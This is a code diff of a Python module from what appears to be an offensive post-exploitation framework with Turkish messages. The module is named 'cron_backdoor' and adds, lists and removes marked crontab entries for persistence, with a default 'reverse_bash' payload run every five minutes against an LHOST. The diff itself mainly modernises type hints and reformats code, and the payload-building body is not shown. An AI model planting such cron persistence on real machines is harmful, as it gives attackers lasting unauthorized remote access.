@@ -20,19 +20,16 @@
 # =============================================================================
 
 import subprocess
-import shlex
-from typing import Dict, Any, List, Optional
+from typing import Any
 
 from rich import print
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
-from rich.syntax import Syntax
 
+from core import logger
 from core.module import BaseModule
 from core.option import Option
-from core import logger
-
 
 # Modülün eklediği satırları işaretlemek için kullanılan yorum etiketi
 _MARKER = "# MAH-PERSIST"
@@ -58,7 +55,7 @@ class cron_backdoor(BaseModule):
     Category = "post/persist"
     Version = "1.0"
 
-    Requirements: Dict[str, List[str]] = {}
+    Requirements: dict[str, list[str]] = {}
 
     def __init__(self):
         super().__init__()
@@ -112,12 +109,14 @@ class cron_backdoor(BaseModule):
     # ── YARDIMCI ─────────────────────────────────────────────────────────────
 
     @staticmethod
-    def _get_crontab() -> Optional[str]:
+    def _get_crontab() -> str | None:
         """Mevcut kullanıcı crontab içeriğini döner; yoksa None."""
         try:
             result = subprocess.run(
                 ["crontab", "-l"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             if result.returncode == 0:
                 return result.stdout
@@ -131,13 +130,16 @@ class cron_backdoor(BaseModule):
         try:
             proc = subprocess.run(
                 ["crontab", "-"],
-                input=content, capture_output=True, text=True, timeout=10,
+                input=content,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             return proc.returncode == 0
         except Exception:
             return False
 
-    def _build_payload_line(self, options: Dict[str, Any]) -> str:
+    def _build_payload_line(self, options: dict[str, Any]) -> str:
         """Crontab satırını oluşturur."""
         schedule = str(options.get("SCHEDULE", "*/5 * * * *"))
         payload_type = str(options.get("PAYLOAD_TYPE", "reverse_bash")).lower()
@@ -162,10 +164,12 @@ class cron_backdoor(BaseModule):
         raw = self._get_crontab()
         self.console.print()
         if raw is None or raw.strip() == "":
-            self.console.print("[yellow][!] Mevcut crontab boş veya erişilemez.[/yellow]")
+            self.console.print(
+                "[yellow][!] Mevcut crontab boş veya erişilemez.[/yellow]"
+            )
             return True
 
-        lines = [l for l in raw.splitlines() if l.strip()]
+        lines = [line for line in raw.splitlines() if line.strip()]
         tbl = Table(title="📋 Mevcut Crontab Girişleri", border_style="blue")
         tbl.add_column("#", style="dim", justify="right")
         tbl.add_column("Girdi", style="white")
@@ -179,11 +183,13 @@ class cron_backdoor(BaseModule):
         self.console.print(f"  [bold]Toplam:[/bold] {len(lines)} girdi")
         return True
 
-    def _action_add(self, options: Dict[str, Any]) -> bool:
+    def _action_add(self, options: dict[str, Any]) -> bool:
         """Crontab'a yeni kalıcılık giridisi ekler."""
         new_line = self._build_payload_line(options)
         if not new_line:
-            print("[bold red][-] Payload oluşturulamadı. LHOST veya PAYLOAD_CMD kontrol edin.[/bold red]")
+            print(
+                "[bold red][-] Payload oluşturulamadı. LHOST veya PAYLOAD_CMD kontrol edin.[/bold red]"
+            )
             return False
 
         # Mevcut içerik
@@ -191,17 +197,21 @@ class cron_backdoor(BaseModule):
 
         # Aynı satır zaten var mı?
         if _MARKER in current:
-            print("[yellow][!] Bu modül tarafından eklenmiş bir girdi zaten mevcut. "
-                  "Önce 'remove' ile kaldırın.[/yellow]")
+            print(
+                "[yellow][!] Bu modül tarafından eklenmiş bir girdi zaten mevcut. "
+                "Önce 'remove' ile kaldırın.[/yellow]"
+            )
             return False
 
         new_content = current.rstrip("\n") + "\n" + new_line + "\n"
         if self._set_crontab(new_content):
-            self.console.print(Panel(
-                f"[green]{new_line.replace(_MARKER, '').strip()}[/green]",
-                title="[bold green]✔ Cron Job Eklendi[/bold green]",
-                border_style="green",
-            ))
+            self.console.print(
+                Panel(
+                    f"[green]{new_line.replace(_MARKER, '').strip()}[/green]",
+                    title="[bold green]✔ Cron Job Eklendi[/bold green]",
+                    border_style="green",
+                )
+            )
             return True
         else:
             print("[bold red][-] Crontab yazılamadı.[/bold red]")
@@ -214,13 +224,15 @@ class cron_backdoor(BaseModule):
             print("[yellow][!] Kaldırılacak MAH girişi bulunamadı.[/yellow]")
             return True
 
-        cleaned = "\n".join(
-            line for line in current.splitlines()
-            if _MARKER not in line
-        ) + "\n"
+        cleaned = (
+            "\n".join(line for line in current.splitlines() if _MARKER not in line)
+            + "\n"
+        )
 
         if self._set_crontab(cleaned):
-            print("[bold green][+] MAH cron girişleri başarıyla kaldırıldı.[/bold green]")
+            print(
+                "[bold green][+] MAH cron girişleri başarıyla kaldırıldı.[/bold green]"
+            )
             return True
         else:
             print("[bold red][-] Crontab güncellenemedi.[/bold red]")
@@ -228,15 +240,17 @@ class cron_backdoor(BaseModule):
 
     # ── RUN ──────────────────────────────────────────────────────────────────
 
-    def run(self, options: Dict[str, Any]) -> bool:
+    def run(self, options: dict[str, Any]) -> bool:
         action = str(options.get("ACTION", "list")).lower()
         logger.info(f"Cron backdoor modülü çalıştırıldı (action={action})")
 
         self.console.print()
-        self.console.print(Panel.fit(
-            "[bold cyan]🕐 CRON BACKDOOR — Kalıcılık Modülü[/bold cyan]",
-            border_style="cyan",
-        ))
+        self.console.print(
+            Panel.fit(
+                "[bold cyan]🕐 CRON BACKDOOR — Kalıcılık Modülü[/bold cyan]",
+                border_style="cyan",
+            )
+        )
 
         if action == "list":
             return self._action_list()
@@ -245,6 +259,8 @@ class cron_backdoor(BaseModule):
         elif action == "remove":
             return self._action_remove()
         else:
-            print(f"[bold red][-] Bilinmeyen action: {action}. "
-                  f"Geçerli değerler: list, add, remove[/bold red]")
+            print(
+                f"[bold red][-] Bilinmeyen action: {action}. "
+                f"Geçerli değerler: list, add, remove[/bold red]"
+            )
             return False
